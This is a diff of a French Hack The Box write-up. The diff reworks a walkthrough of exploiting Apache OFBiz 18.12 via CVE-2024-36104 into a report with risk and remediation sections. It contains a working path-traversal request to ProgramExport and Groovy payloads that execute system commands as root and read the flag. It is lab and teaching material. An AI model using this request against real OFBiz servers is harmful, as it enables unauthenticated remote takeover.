@@ -1,13 +1,21 @@
+# HTB — OFBiz Write-up
 
-## 🎯 Objectif
-
-Trouver une vulnérabilité sur **Apache OFBiz 18.12** permettant d'exécuter des commandes sur la machine et récupérer le flag.
-
-**IP :** `10.129.231.23`
+- **Machine :** OffBiz
+- **Plateforme :** Hack The Box
+- **OS :** Linux
+- **IP :** 10.129.231.23
 
 ---
 
-## 1. 🔎 Trouver les services
+## Description
+
+La machine expose une instance **Apache OFBiz 18.12**, un ERP web accessible en HTTPS via `/catalog`. Cette version est vulnérable à **CVE-2024-36104**, une faille de **Path Traversal** dans le composant `webtools` qui permet de contourner les contrôles d'accès et d'atteindre le point d'entrée `ProgramExport`, lequel interprète du code **Groovy** fourni en paramètre. Ce *workflow* (outils d'administration/export de webtools) n'est normalement accessible qu'aux administrateurs authentifiés ; le path traversal permet de le contourner entièrement, ouvrant la voie à une exécution de commandes arbitraire (RCE) côté serveur.
+
+---
+
+## Exploitation
+
+### 1. Reconnaissance
 
 ```bash
 nmap -sV 10.129.231.23
@@ -15,93 +23,37 @@ nmap -sV 10.129.231.23
 
 Ports intéressants :
 
-```text
-22 → SSH
-80 → HTTP
+```
+22  → SSH
+80  → HTTP
 443 → HTTPS
 ```
 
-Le port 80 affichait seulement la page par défaut de NGINX.
+Le port 80 n'affiche que la page par défaut de NGINX ; le HTTPS est donc testé.
 
-Je teste donc aussi le HTTPS.
-
----
-
-## 2. 🌐 Trouver les répertoires
+### 2. Découverte de l'application
 
 ```bash
 gobuster dir -u https://10.129.231.23 -k -w /usr/share/wordlists/dirb/common.txt
 ```
 
-Je trouve notamment :
+Répertoire trouvé : `/catalog`, qui redirige vers `/catalog/control/main` — une page de connexion.
 
-```text
-/catalog
+Le code source de la page révèle :
+
 ```
-
-En allant sur :
-
-```text
-https://10.129.231.23/catalog/
-```
-
-je suis redirigé vers :
-
-```text
-/catalog/control/main
-```
-
-J'arrive sur une page de connexion.
-
-Dans le code source, je trouve :
-
-```text
 Powered by Apache OFBiz. Release 18.12
 ```
 
-### 🧠 À retenir
+Cette version permet d'identifier la vulnérabilité connue **CVE-2024-36104**.
 
-Quand on trouve **le logiciel + sa version**, on peut chercher ses vulnérabilités connues.
+### 3. Identification de la vulnérabilité
 
----
+CVE-2024-36104 (Apache OFBiz) permet un **Path Traversal** via des séquences encodées (`%2e` = `.`), qui débouche sur une **RCE**. La requête vulnérable cible le composant `webtools`.
 
-## 3. 🐛 Identifier la vulnérabilité
+### 4. Exploitation via Burp Repeater
 
-La machine indique qu'elle utilise :
-
-```text
-CVE-2024-36104
-```
-
-Cette vulnérabilité concerne **Apache OFBiz**.
-
-Elle permet notamment de faire un **Path Traversal** puis d'obtenir une **RCE**.
-
-### Path Traversal ?
-
-C'est lorsqu'on manipule un chemin avec des séquences comme :
-
-```text
-..
-```
-
-pour essayer de sortir du chemin prévu par l'application.
-
-Ici, des caractères encodés sont utilisés :
-
-```text
-%2e
-```
-
-`%2e` représente `.`.
-
----
-
-# 4. 🧪 Tester avec Burp Repeater
-
-J'utilise Burp Suite → **Repeater** pour modifier les requêtes HTTP.
-
-La requête intéressante devient :
+Requête modifiée pour contourner le contrôle d'accès et atteindre `ProgramExport` :
 
 ```http
 POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport HTTP/1.1
@@ -112,38 +64,17 @@ Connection: close
 groovyProgram=test
 ```
 
-Au début, j'obtiens :
+Réponse initiale : `Web Tools Permission Error`, mais une erreur Groovy apparaît également :
 
-```text
-Web Tools Permission Error
+```
+MissingPropertyException: No such property: test
 ```
 
-Mais une erreur Groovy apparaît aussi :
+Cela confirme que le paramètre `groovyProgram` est interprété par le moteur Groovy — le mécanisme vulnérable est bien atteint.
 
-```text
-MissingPropertyException:
-No such property: test
-```
+### 5. Exécution de commandes
 
-### 🧠 Interprétation
-
-C'est une bonne information.
-
-Cela signifie que :
-
-```text
-groovyProgram
-      ↓
-est interprété par Groovy
-```
-
-On a donc réussi à atteindre le mécanisme vulnérable.
-
----
-
-# 5. 💻 Tester l'exécution d'une commande
-
-Je remplace `test` par :
+Remplacement de la valeur par un payload Groovy exécutant une commande système :
 
 ```groovy
 throw new Exception('id'.execute().text)
@@ -151,106 +82,72 @@ throw new Exception('id'.execute().text)
 
 Résultat :
 
-```text
+```
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### 🧠 Interprétation
+La commande `id` est exécutée avec les privilèges **root**, confirmant une RCE en root.
 
-La commande Linux `id` a été exécutée.
-
-Et surtout :
-
-```text
-uid=0(root)
-```
-
-signifie que la commande est exécutée avec les privilèges **root**.
-
-➡️ J'ai donc obtenu une **RCE en root**.
-
----
-
-# 6. 📍 Comprendre où je suis
-
-Commande :
+### 6. Reconnaissance post-exploitation
 
 ```groovy
 throw new Exception('pwd'.execute().text)
 ```
 
-Résultat :
+Résultat : `/root/ofbiz-framework`.
 
-```text
-/root/ofbiz-framework
-```
-
-Je sais maintenant que le répertoire courant est :
-
-```text
-/root/ofbiz-framework
-```
-
----
-
-# 7. 🚩 Récupérer le flag
-
-Comme je suis `root`, je peux lire le fichier :
-
-```text
-/root/root.txt
-```
-
-Commande :
+### 7. Récupération du flag
 
 ```groovy
 throw new Exception('cat /root/root.txt'.execute().text)
 ```
 
-Résultat :
-
-```text
-85ae696787f9c3b897311801fbd23cf6
-```
-
-➡️ **Root flag récupéré.**
+Résultat : `85ae696787f9c3b897311801fbd23cf6`
 
 ---
 
-# 🔗 Résumé de l'exploitation
+## PoC
 
-```text
-Nmap
- ↓
-HTTPS
- ↓
-Gobuster
- ↓
-/catalog
- ↓
-Apache OFBiz 18.12
- ↓
-CVE-2024-36104
- ↓
-Path Traversal
- ↓
-ProgramExport
- ↓
-groovyProgram
- ↓
-RCE
- ↓
-root
- ↓
-cat /root/root.txt
- ↓
-FLAG
+```http
+POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport HTTP/1.1
+Host: 10.129.231.23
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+groovyProgram=throw new Exception('id'.execute().text)
 ```
----
-## 🏁 Résultat
 
-**Vulnérabilité :** CVE-2024-36104  
-**Application :** Apache OFBiz 18.12  
-**Technique :** Path Traversal → Groovy → RCE  
-**Privilèges :** root  
-**Flag :** `85ae696787f9c3b897311801fbd23cf6`
+```groovy
+throw new Exception('cat /root/root.txt'.execute().text)
+```
+
+---
+
+## Risk
+
+- **Contournement d'authentification/autorisation** : le path traversal encodé permet d'atteindre un point d'entrée normalement protégé (`webtools`) sans être authentifié.
+- **Exécution de code arbitraire (RCE)** : le paramètre `groovyProgram` est interprété directement par le moteur Groovy côté serveur, ce qui permet d'exécuter n'importe quelle commande système.
+- **Exécution avec les privilèges root** : la RCE s'exécute directement en tant que `root`, ce qui constitue une compromission totale et immédiate de la machine, sans étape de privesc supplémentaire.
+- **Impact global** : accès complet au système (lecture/écriture de tout fichier, y compris les données sensibles de l'ERP), risque de pivot vers d'autres systèmes connectés à l'application, arrêt de service possible.
+
+---
+
+## Remediation
+
+- Mettre à jour Apache OFBiz vers une version corrigeant CVE-2024-36104 (patch officiel du projet).
+- Renforcer la validation et la normalisation des chemins côté serveur pour empêcher tout contournement par séquences encodées (`%2e`, `../`, etc.) avant application des contrôles d'accès.
+- Désactiver ou restreindre l'accès aux composants `webtools` (dont `ProgramExport`) en production, ou les protéger derrière une authentification forte et un contrôle réseau (liste blanche d'IP, VPN).
+- Ne jamais exécuter les processus applicatifs avec les privilèges root ; appliquer le principe de moindre privilège sur le compte système exécutant OFBiz.
+- Mettre en place une supervision/alerting sur les tentatives de path traversal et les erreurs Groovy inhabituelles dans les logs applicatifs.
+
+---
+
+## Résumé
+
+**Machine :** OffBiz
+**Vulnérabilité principale :** CVE-2024-36104 — Path Traversal → RCE Groovy (Apache OFBiz 18.12)
+**Accès initial :** RCE directe via `ProgramExport`
+**Privilèges obtenus :** Root (immédiat)
+
+**Flags :**
+- Root : `85ae696787f9c3b897311801fbd23cf6`
